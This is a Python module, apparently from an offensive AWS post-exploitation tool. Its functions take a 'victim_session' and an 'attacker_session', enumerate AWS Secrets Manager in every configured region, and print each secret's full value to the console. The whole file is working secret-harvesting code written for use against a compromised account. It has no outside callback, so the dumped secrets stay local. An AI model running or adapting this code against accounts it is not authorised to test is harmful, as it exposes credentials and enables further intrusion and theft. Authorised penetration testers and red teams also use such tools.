from colorama import Fore
import json, sys
from modules.utils import custom_serializer
import modules.globals as my_globals

def secrets_manager_init_enum(victim_session, attacker_session):
    list_secrets_manager(victim_session)

def list_secrets_manager(victim_session):
    print(f"{Fore.GREEN}Enumerating Secrets Manager...")
    for region in my_globals.aws_regions:
        try:
            secrets_client = victim_session.client("secretsmanager", region_name=region)
            secrets_list = secrets_client.list_secrets().get("SecretList", [])
            for secret in secrets_list:
                name = secret.get("Name")
                print(f"{Fore.MAGENTA}Region: {region} | Secret Name: {name}")
                try:
                    secret_dump = secrets_client.get_secret_value(SecretId=name)
                    print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}")
                except KeyboardInterrupt:
                    raise
                except:
                    print(f"{Fore.LIGHTBLACK_EX}Failed to retrieve secret: {name}")
        except KeyboardInterrupt:
            raise
        except:
            sys.stdout.write("\r\033[K")
            sys.stdout.write(f"{Fore.LIGHTBLACK_EX}Failed to list secrets in region {region}")
            sys.stdout.flush()
    print("")